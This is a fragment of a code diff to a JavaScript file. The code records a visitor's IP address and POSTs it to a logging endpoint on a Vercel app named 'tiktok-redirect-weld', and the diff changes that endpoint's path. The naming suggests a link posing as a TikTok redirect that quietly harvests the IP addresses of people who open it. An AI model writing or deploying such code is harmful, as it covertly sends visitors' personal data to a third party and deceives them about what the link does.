@@ -14,7 +14,7 @@
             .then(data => {
                 console.log('IP Address:', data.ip);
                 // Log the IP address to a server or database
-                fetch('https://tiktok-redirect-weld.vercel.app/logip', {
+                fetch('https://tiktok-redirect-weld.vercel.app/api/logip', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
